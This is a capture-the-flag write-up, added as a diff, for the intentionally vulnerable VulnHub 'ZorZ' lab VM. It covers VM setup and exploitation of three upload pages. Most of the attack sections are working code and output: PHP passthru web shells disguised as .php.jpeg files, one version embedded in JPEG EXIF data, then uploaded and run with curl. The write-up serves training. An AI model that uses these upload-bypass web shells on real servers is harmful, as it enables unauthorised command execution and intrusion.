@@ -1,0 +1,541 @@
+.. include:: /pentest_links.txt
+
+.. _ZorZ:
+
+****
+ZorZ
+****
+
+Setup
+=====
+
+This is to document the meetup's efforts responding to the challenge `TopHatSec: ZorZ <https://www.vulnhub.com/entry/tophatsec-zorz%2c117/#>`_:
+
+  ZORZ is another VM that will challenge your webapp skills. There are 3 separate challenges (web pages) on this machine. It should be pretty straight forward. I have explained as much as I can in the readme file:
+
+  Welcome to the ZorZ VM Challenge
+
+  This machine will probably test your web app skills once again. There are 3 different pages that should be focused on (you will see!) If you solve one or all three pages, please send me an email and quick write up on how you solved each challenge. Your goal is to successfully upload a webshell or malicious file to the server. If you can execute system commands on this box, thats good enough!!! I hope you have fun!
+
+  admin@top-hat-sec.com
+
+
+  VulnHub note: You may have issues when importing to VMware. If this is the case. extract the HDD from the OVA file (using something like 7zip), and attach to a new VM. Please see the following guide: https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/. 
+
+`Rebootuser - Local Linux Enumeration & Privilege Escalation <http://www.rebootuser.com/?page_id=1721>`_ shows techniques/hints.
+
+Setting up the VMware VM
+------------------------
+
+The VM comes packaged as `Zorz.ova <http://download.vulnhub.com/tophatsec/Zorz.ova>`_, which is a tar archive containing a VMware vmdk file.
+
+See :ref:`VMSetup` for background on using the VMware vmdk file. ZorZ is Ubuntu 14.04, x86, and 1024MB memory. For KVM you can use a backing store to undo any changes to the disk:
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  BACKING=Zorz-disk1.vmdk
+  VM_DISK=Zorz-changes.qcow2
+  curl --remote-name http://download.vulnhub.com/tophatsec/Zorz.ova
+  tar -xvf Zorz.ova
+  $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+  $SUDO qemu-img info $BACKING
+  $SUDO qemu-img info $VM_DISK
+  # To revert to original image
+  # $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+
+Then Linux KVM could use the VM_DISK to create the ZorZ VM. The actual command the author used in Debian Linux to create the VM was (os-variant=ubuntutrusty was not supported on Debian Jessie at this time):
+
+.. code-block:: bash
+
+  VM=ZorZ
+  $SUDO virt-install \
+      --name "ZorZ" --cpu host --vcpus 1 --ram 1024 \
+      --os-type=linux --os-variant=ubuntuprecise \
+      --disk path=$VM_DISK \
+      --noautoconsole \
+      --accelerate --hvm \
+      --import
+  #    --console pty,target_type=virtio \
+  # Useful commands:
+  # $SUDO virsh help
+  # $SUDO virsh list --all
+  # $SUDO virsh destroy --graceful $VM
+  # $SUDO virsh start $VM
+  # $SUDO virsh reboot $VM
+  # $SUDO virsh shutdown $VM
+  # $SUDO virsh undefine [--wipe-storage] $VM
+  # $SUDO virsh undefine $VM
+  # $SUDO virsh help destroy
+  # 
+
+So if ZorZ were running and you wanted to "start over again":
+
+.. code-block:: bash
+
+  $SUDO virsh shutdown $VM
+  $SUDO virsh undefine $VM
+  $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+  $SUDO virt-install \
+      --name "ZorZ" --cpu host --vcpus 1 --ram 512 \
+      --os-type=linux --os-variant=ubuntuprecise \
+      --disk path=$VM_DISK \
+      --noautoconsole \
+      --accelerate --hvm \
+      --import
+
+
+Attacking HTTP
+==============
+
+Real Reconnaissance vs. Documenting the Attack
+----------------------------------------------
+
+Here we focus on documenting the attack and rely on command line tools. That has several advantages: it's easier to document (no screen shots required); it's easier to repeat (simply cut-and-paste the input lines into a terminal session); prepares the user for command-line-only situations; and doesn't suffer from the "how do I do it in IE/chrome/firefox" questions.
+
+However, when you first approach a web challenge it's much, much easier to use a web browser and its tools to view the pages. Additionally, using an intercepting proxy like `Burp Suite`_ or `ZAP`_ allows easier investigation. Once you've used the GUI you can often translate that to a command line solution; this fails in those cases where a browser is required (i.e. client-side Javascript).
+
+HTTP Reconnaissance - 3 Upload Pages
+------------------------------------
+
+Since this is a web exercise we'll skip using ``enumerator`` and proceed directly with web page reconnaissance.
+
+Upload 1 Web Page
+^^^^^^^^^^^^^^^^^
+
+Fetching the web page we see:
+
+.. code-block:: console
+
+  hacker@kali:~$ curl --silent --output upload1.html http://$IP/
+  hacker@kali:~$ cat upload1.html
+  <!DOCTYPE html>
+  <html>
+  <body>
+  <center>
+  <br><br><br>
+  <form action="uploader.php" method="post" enctype="multipart/form-data">
+	  <b>ZorZ Image Uploader!:</b><br><br>
+	  <input type="file" name="upfile" id="upfile"><br><br>
+	  <input type="submit" value="Upload Image" name="submit">
+  </form>
+  <br><a href="index2.html">Try ZorZ Image Uploader2!</a>
+  </center>
+  </body>
+  </html>
+
+  hacker@kali:~$ # see "index2.html" exists so fetch it
+
+Upload 2 Web Page
+^^^^^^^^^^^^^^^^^
+
+There's another upload web page at http://$IP/index2.html:
+
+.. code-block:: console
+
+  hacker@kali:~$ curl --silent --output upload2.html http://$IP/index2.html
+  hacker@kali:~$ cat upload2.html
+  <!DOCTYPE html>
+  <html>
+  <title>ZorZ Uploader 2</title>
+  <body>
+  <center>
+  <br><br><br>
+  <form action="uploader2.php" method="post" enctype="multipart/form-data">
+	  <b>ZorZ Image Uploader 2!:</b><br><br>
+	  <input type="file" name="upfile" id="upfile"><br><br>
+	  <input type="submit" value="Upload Image" name="submit">
+  </form>
+  <br><br><a href="index.html">ZorZ Image Uploader 1</a><br><a href="/jQuery/upload.php">ZorZ Image Uploader3</a>
+  </center>
+  </body>
+  </html>
+
+  hacker@kali:~$ # see "/jQuery/upload.php" exists so fetch it
+
+Upload 3 Web Page
+^^^^^^^^^^^^^^^^^
+
+There's yet another upload web page at http://$IP/jQuery/upload.php:
+
+.. code-block:: console
+
+  hacker@kali:~$ curl --silent --output upload3.html http://$IP/jQuery/upload.php
+  hacker@kali:~$ cat upload3.html 
+
+
+
+  <!DOCTYPE html>
+  <html>
+  <head>
+  <title>ZorZ Uploader3</title>
+  <link href="style.css" rel="stylesheet">
+  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+  <script src="script.js"></script>
+  </head>
+  <body>
+  <div id="mainform">
+  <div id="innerdiv">
+  <h2>ZorZ Image Uploader3!</h2>
+  <!-- Required Div Starts Here -->
+  <div id="formdiv">
+  <h3>Upload Form</h3>
+  <form action="" enctype="multipart/form-data" id="form" method="post" name="form">
+  <div id="upload">
+  <input id="file" name="file" type="file">
+  </div>
+  <input id="submit" name="submit" type="submit" value="Upload">
+  </form>
+  <div id="detail">
+  <b>Note:</b>
+  <ul>
+  <li><< Click on the white box to select file!.</li>
+  <li><b>images(jpeg,jpg,png).</b></li>
+  <li>Image should be less than 100kb in size.</li>
+  </ul>
+  </div>
+  </div>
+  <div id="clear"></div>
+  <div id="preview">
+  <img id="previewimg" src=""><img id="deleteimg" src="delete.png">
+  <span class="pre">IMAGE PREVIEW</span>
+  </div>
+  <div id="message">
+  </div>
+  </div>
+  </div>
+  </body>
+  </html>
+
+Upload 1 Expoit
+---------------
+
+Basically the same approach works for all the uploads. The exploit is based on uploading a php script that lists files in /var/www (using the trick that FILE.php.jpeg is treated like a jpeg file on upload but executes like a php file when fetched). For Upload 1 the file only needs to have the filename extension be an image (jpeg); the file doesn't actually have to be jpeg format.
+
+.. code-block:: bash
+
+  CMD="ls -laR /var/www"
+  cat > command.php.jpeg <<EOF
+  <?php
+  passthru( "$CMD");
+  ?>
+  EOF
+  curl --silent \
+       --form upfile="@command.php.jpeg" \
+       --form submit="Upload Image" \
+       http://$IP/uploader.php \
+    | grep 'successfully uploaded'
+  curl http://$IP/uploads1/command.php.jpeg
+
+
+Running the above shows us the target file :file:`SECRETFILE`:
+
+.. code-block:: console
+  :emphasize-lines: 1,2,7-11,13,49
+
+  hacker@kali:~$ CMD="ls -laR /var/www"
+  hacker@kali:~$ cat > command.php.jpeg <<EOF
+  > <?php
+  > passthru( "$CMD");
+  > ?>
+  > EOF
+  hacker@kali:~$ curl --silent \
+  >      --form upfile="@command.php.jpeg" \
+  >      --form submit="Upload Image" \
+  >      http://$IP/uploader.php \
+  >   | grep 'successfully uploaded'
+  <p>File is valid, and was successfully uploaded.
+  hacker@kali:~$ curl http://$IP/uploads1/command.php.jpeg
+  /var/www:
+  total 12
+  drwxr-xr-x  3 root root 4096 Feb 17 20:44 .
+  drwxr-xr-x 12 root root 4096 Feb 17 20:44 ..
+  drwxr-xr-x  7 root root 4096 Feb 18 22:40 html
+
+  /var/www/html:
+  total 48
+  drwxr-xr-x 7 root     root     4096 Feb 18 22:40 .
+  drwxr-xr-x 3 root     root     4096 Feb 17 20:44 ..
+  -rwxr-xr-x 1 www-data www-data  367 Feb 18 20:54 index.html
+  -rwxr-xr-x 1 root     root      457 Feb 18 22:30 index2.html
+  drwxr-xr-x 2 root     root     4096 Feb 18 22:22 jQuery
+  drwxr-xr-x 2 root     root     4096 Feb 18 22:45 l337saucel337
+  -rw-r--r-- 1 root     root      398 Feb 18 20:20 uploader.php
+  -rw-r--r-- 1 root     root     1410 Feb 18 20:50 uploader2.php
+  -rwxr-xr-x 1 root     root     1980 Feb 18 16:40 uploader3.php
+  drwxr-xr-x 2 www-data www-data 4096 Apr 21 16:58 uploads1
+  drwxr-xr-x 2 www-data www-data 4096 Feb 18 22:39 uploads2
+  drwxr-xr-x 2 www-data root     4096 Feb 18 22:39 uploads3
+
+  /var/www/html/jQuery:
+  total 28
+  drwxr-xr-x 2 root root 4096 Feb 18 22:22 .
+  drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..
+  -rw-r--r-- 1 root root  753 Aug  7  2009 delete.png
+  -rw-r--r-- 1 root root  715 Feb 18 21:59 script.js
+  -rw-r--r-- 1 root root 1714 Feb 18 22:00 style.css
+  -rw-r--r-- 1 root root 1049 Feb 18 22:18 upload.php
+  -rw-r--r-- 1 root root 1232 Feb 18 22:19 uploadphp.php
+
+  /var/www/html/l337saucel337:
+  total 12
+  drwxr-xr-x 2 root root 4096 Feb 18 22:45 .
+  drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..
+  -rw-r--r-- 1 root root  400 Feb 18 22:45 SECRETFILE
+
+  /var/www/html/uploads1:
+  total 12
+  drwxr-xr-x 2 www-data www-data 4096 Apr 21 16:58 .
+  drwxr-xr-x 7 root     root     4096 Feb 18 22:40 ..
+  -rw-r--r-- 1 www-data www-data   40 Apr 21 16:58 command.php.jpeg
+
+  /var/www/html/uploads2:
+  total 8
+  drwxr-xr-x 2 www-data www-data 4096 Feb 18 22:39 .
+  drwxr-xr-x 7 root     root     4096 Feb 18 22:40 ..
+
+  /var/www/html/uploads3:
+  total 8
+  drwxr-xr-x 2 www-data root 4096 Feb 18 22:39 .
+  drwxr-xr-x 7 root     root 4096 Feb 18 22:40 ..
+
+Now we fetch the SECRETFILE:
+
+.. code-block:: console
+
+  hacker@kali:~$ curl --silent --remote-name http://$IP/l337saucel337/SECRETFILE
+  hacker@kali:~$ cat SECRETFILE
+  Great job so far. This box has 3 uploaders.
+
+  The first 2 are pure php, the last one is php w/jquery.
+
+  To get credit for this challenge, please submit a write-up or instructions
+  on how you compromised the uploader or uploaders. If you solve 1, 2, or all
+  of the uploader challenges, feel free to shoot me an email and let me know!
+
+  admin@top-hat-sec.com
+
+  Thanks for playing!
+  http://www.top-hat-sec.com
+
+Upload 2 Expoit
+---------------
+
+Basically the same approach as Upload 1 except that the file must really be a jpeg file. We select a jpeg file from the http://www.exiv2.org/ site. So how to get the php script into the jpeg file? Use the ``exiftool`` to set one of the jpeg file TAG fields (here the DocumentName) to a php script.
+
+.. code-block:: bash
+
+  JPEG=trick.php.jpeg
+  curl --silent --output $JPEG  http://www.exiv2.org/include/img_1771.jpg
+  exiftool -DocumentName='<?php passthru("ls -laR /var/www"); ?>' $JPEG
+  curl --silent \
+       --form upfile="@$JPEG" \
+       --form submit="Upload Image" \
+       http://$IP/uploader2.php \
+    | grep 'Success!'
+  curl --silent http://$IP/uploads2/$JPEG 2>&1 | strings | sed /^Canon/q
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-3,5-9,11,46
+
+  hacker@kali:~$ JPEG=trick.php.jpeg
+  hacker@kali:~$ curl --silent --output $JPEG  http://www.exiv2.org/include/img_1771.jpg
+  hacker@kali:~$ exiftool -DocumentName='<?php passthru("ls -laR /var/www"); ?>' $JPEG
+      1 image files updated
+  hacker@kali:~$ curl --silent \
+  >      --form upfile="@$JPEG" \
+  >      --form submit="Upload Image" \
+  >      http://$IP/uploader2.php \
+  >   | grep 'Success!'
+   Success! image/jpeg.The file trick.php.jpeg has been uploaded. 
+  hacker@kali:~$ curl --silent http://$IP/uploads2/$JPEG 2>&1 | strings | sed /^Canon/q
+  JFIF
+  Exif
+  /var/www:
+  total 12
+  drwxr-xr-x  3 root root 4096 Feb 17 20:44 .
+  drwxr-xr-x 12 root root 4096 Feb 17 20:44 ..
+  drwxr-xr-x  7 root root 4096 Feb 18 22:40 html
+  /var/www/html:
+  total 48
+  drwxr-xr-x 7 root     root     4096 Feb 18 22:40 .
+  drwxr-xr-x 3 root     root     4096 Feb 17 20:44 ..
+  -rwxr-xr-x 1 www-data www-data  367 Feb 18 20:54 index.html
+  -rwxr-xr-x 1 root     root      457 Feb 18 22:30 index2.html
+  drwxr-xr-x 2 root     root     4096 Feb 18 22:22 jQuery
+  drwxr-xr-x 2 root     root     4096 Feb 18 22:45 l337saucel337
+  -rw-r--r-- 1 root     root      398 Feb 18 20:20 uploader.php
+  -rw-r--r-- 1 root     root     1410 Feb 18 20:50 uploader2.php
+  -rwxr-xr-x 1 root     root     1980 Feb 18 16:40 uploader3.php
+  drwxr-xr-x 2 www-data www-data 4096 Apr 21 16:58 uploads1
+  drwxr-xr-x 2 www-data www-data 4096 Apr 21 19:05 uploads2
+  drwxr-xr-x 2 www-data root     4096 Feb 18 22:39 uploads3
+  /var/www/html/jQuery:
+  total 28
+  drwxr-xr-x 2 root root 4096 Feb 18 22:22 .
+  drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..
+  -rw-r--r-- 1 root root  753 Aug  7  2009 delete.png
+  -rw-r--r-- 1 root root  715 Feb 18 21:59 script.js
+  -rw-r--r-- 1 root root 1714 Feb 18 22:00 style.css
+  -rw-r--r-- 1 root root 1049 Feb 18 22:18 upload.php
+  -rw-r--r-- 1 root root 1232 Feb 18 22:19 uploadphp.php
+  /var/www/html/l337saucel337:
+  total 12
+  drwxr-xr-x 2 root root 4096 Feb 18 22:45 .
+  drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..
+  -rw-r--r-- 1 root root  400 Feb 18 22:45 SECRETFILE
+  /var/www/html/uploads1:
+  total 12
+  drwxr-xr-x 2 www-data www-data 4096 Apr 21 16:58 .
+  drwxr-xr-x 7 root     root     4096 Feb 18 22:40 ..
+  -rw-r--r-- 1 www-data www-data   40 Apr 21 16:58 command.php.jpeg
+  /var/www/html/uploads2:
+  total 192
+  drwxr-xr-x 2 www-data www-data  4096 Apr 21 19:05 .
+  drwxr-xr-x 7 root     root      4096 Feb 18 22:40 ..
+  -rw-r--r-- 1 www-data www-data 32764 Apr 21 17:22 command.php.jpeg
+  -rw-r--r-- 1 www-data www-data 10040 Apr 21 17:27 command10000.php.jpeg
+  -rw-r--r-- 1 www-data www-data 10000 Apr 21 17:26 command10000.php.jpg
+  -rw-r--r-- 1 www-data www-data 32154 Apr 21 18:45 fake.php.jpeg
+  -rw-r--r-- 1 www-data www-data 32764 Apr 21 17:17 img_1771.jpg
+  -rw-r--r-- 1 www-data www-data 32154 Apr 21 19:05 trick.php.jpeg
+  -rw-r--r-- 1 www-data www-data 32154 Apr 21 18:39 x.php.jpeg
+  /var/www/html/uploads3:
+  total 8
+  drwxr-xr-x 2 www-data root 4096 Feb 18 22:39 .
+  drwxr-xr-x 7 root     root 4096 Feb 18 22:40 ..
+  Canon
+
+Now we can proceed as in the case of Upload 1 and fetch SECRETFILE:
+
+.. code-block:: console
+
+  hacker@kali:~$ curl --silent --remote-name http://$IP/l337saucel337/SECRETFILE
+  hacker@kali:~$ cat SECRETFILE
+  Great job so far. This box has 3 uploaders.
+
+  The first 2 are pure php, the last one is php w/jquery.
+
+  To get credit for this challenge, please submit a write-up or instructions
+  on how you compromised the uploader or uploaders. If you solve 1, 2, or all
+  of the uploader challenges, feel free to shoot me an email and let me know!
+
+  admin@top-hat-sec.com
+
+  Thanks for playing!
+  http://www.top-hat-sec.com
+
+
+Upload 3 Expoit
+---------------
+
+Upload 3 is has a form slightly different from Upload 1, but is otherwise the same:
+
+.. code-block:: bash
+
+  CMD="ls -laR /var/www"
+  cat > command.php.jpeg <<EOF
+  <?php
+  passthru( "$CMD");
+  ?>
+  EOF
+  curl --silent \
+       --form file="@command.php.jpeg" \
+       --form submit="Upload" \
+       http://$IP/jQuery/upload.php \
+    | grep 'Your File'
+  curl http://$IP/uploads3/command.php.jpeg
+
+Running the above shows us the target file :file:`SECRETFILE`:
+
+.. code-block:: console
+  :emphasize-lines: 1,2,7-11,13,49
+
+  hacker@kali:~$ CMD="ls -laR /var/www"
+  hacker@kali:~$ cat > command.php.jpeg <<EOF
+  > <?php
+  > passthru( "$CMD");
+  > ?>
+  > EOF
+  hacker@kali:~$ curl --silent \
+  >      --form file="@command.php.jpeg" \
+  >      --form submit="Upload" \
+  >      http://$IP/jQuery/upload.php \
+  >   | grep 'Your File'
+  <span>Your File Uploaded Succesfully...!!</span><br/><br/><b>File Name:</b> command.php.jpeg<br><b>Type:</b> image/jpeg<br><b>Size:</b> 0.0390625 kB<br><b>Temp file:</b> /tmp/phpT8ue8X<br><b>Stored in:</b> uploads3/command.php.jpeg</div>
+  hacker@kali:~$ curl http://$IP/uploads3/command.php.jpeg
+  /var/www:
+  total 12
+  drwxr-xr-x  3 root root 4096 Feb 17 20:44 .
+  drwxr-xr-x 12 root root 4096 Feb 17 20:44 ..
+  drwxr-xr-x  7 root root 4096 Feb 18 22:40 html
+
+  /var/www/html:
+  total 48
+  drwxr-xr-x 7 root     root     4096 Feb 18 22:40 .
+  drwxr-xr-x 3 root     root     4096 Feb 17 20:44 ..
+  -rwxr-xr-x 1 www-data www-data  367 Feb 18 20:54 index.html
+  -rwxr-xr-x 1 root     root      457 Feb 18 22:30 index2.html
+  drwxr-xr-x 2 root     root     4096 Feb 18 22:22 jQuery
+  drwxr-xr-x 2 root     root     4096 Feb 18 22:45 l337saucel337
+  -rw-r--r-- 1 root     root      398 Feb 18 20:20 uploader.php
+  -rw-r--r-- 1 root     root     1410 Feb 18 20:50 uploader2.php
+  -rwxr-xr-x 1 root     root     1980 Feb 18 16:40 uploader3.php
+  drwxr-xr-x 2 www-data www-data 4096 Feb 18 22:38 uploads1
+  drwxr-xr-x 2 www-data www-data 4096 Feb 18 22:39 uploads2
+  drwxr-xr-x 2 www-data root     4096 Apr 21 14:24 uploads3
+
+  /var/www/html/jQuery:
+  total 28
+  drwxr-xr-x 2 root root 4096 Feb 18 22:22 .
+  drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..
+  -rw-r--r-- 1 root root  753 Aug  7  2009 delete.png
+  -rw-r--r-- 1 root root  715 Feb 18 21:59 script.js
+  -rw-r--r-- 1 root root 1714 Feb 18 22:00 style.css
+  -rw-r--r-- 1 root root 1049 Feb 18 22:18 upload.php
+  -rw-r--r-- 1 root root 1232 Feb 18 22:19 uploadphp.php
+
+  /var/www/html/l337saucel337:
+  total 12
+  drwxr-xr-x 2 root root 4096 Feb 18 22:45 .
+  drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..
+  -rw-r--r-- 1 root root  400 Feb 18 22:45 SECRETFILE
+
+  /var/www/html/uploads1:
+  total 8
+  drwxr-xr-x 2 www-data www-data 4096 Feb 18 22:38 .
+  drwxr-xr-x 7 root     root     4096 Feb 18 22:40 ..
+
+  /var/www/html/uploads2:
+  total 8
+  drwxr-xr-x 2 www-data www-data 4096 Feb 18 22:39 .
+  drwxr-xr-x 7 root     root     4096 Feb 18 22:40 ..
+
+  /var/www/html/uploads3:
+  total 12
+  drwxr-xr-x 2 www-data root     4096 Apr 21 14:24 .
+  drwxr-xr-x 7 root     root     4096 Feb 18 22:40 ..
+  -rw-r--r-- 1 www-data www-data   40 Apr 21 14:24 command.php.jpeg
+
+Now we fetch the SECRETFILE:
+
+.. code-block:: console
+
+  hacker@kali:~$ curl --silent --remote-name http://$IP/l337saucel337/SECRETFILE
+  hacker@kali:~$ cat SECRETFILE
+  Great job so far. This box has 3 uploaders.
+
+  The first 2 are pure php, the last one is php w/jquery.
+
+  To get credit for this challenge, please submit a write-up or instructions
+  on how you compromised the uploader or uploaders. If you solve 1, 2, or all
+  of the uploader challenges, feel free to shoot me an email and let me know!
+
+  admin@top-hat-sec.com
+
+  Thanks for playing!
+  http://www.top-hat-sec.com
+
